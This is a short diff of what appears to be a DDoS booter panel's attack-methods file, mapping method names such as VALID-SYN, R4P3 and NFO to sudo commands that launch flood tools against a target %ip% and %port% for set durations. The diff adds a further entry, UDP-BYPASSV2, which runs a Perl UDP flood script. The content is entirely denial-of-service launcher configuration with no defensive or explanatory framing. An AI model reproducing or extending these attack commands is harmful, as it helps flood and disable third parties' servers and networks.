@@ -27,3 +27,5 @@ VALID-SYN : sudo ./WRA %ip% %port% 10 -1 300
 R4P3 : sudo ./gre %ip% 10 -1 300
 
 NFO : sudo ./NFO %ip% %port% 10 -1 300
+
+UDP-BYPASSV2 : sudo perl UDP-BYPASS-V2.pl %ip% %port% 5500 300
